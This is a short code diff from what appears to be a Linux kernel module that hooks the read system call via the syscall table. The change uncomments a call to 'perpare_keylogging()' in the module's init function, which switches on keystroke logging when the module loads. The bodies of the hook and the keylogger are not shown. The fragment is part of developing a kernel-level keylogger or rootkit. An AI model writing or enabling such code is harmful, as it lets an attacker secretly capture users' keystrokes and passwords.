@@ -19,7 +19,7 @@ static int __init mod_init(void)
 	else return 0;
 	hook_read(sct);
 
-  //perpare_keylogging();
+  perpare_keylogging();
 
   return 0;
 }
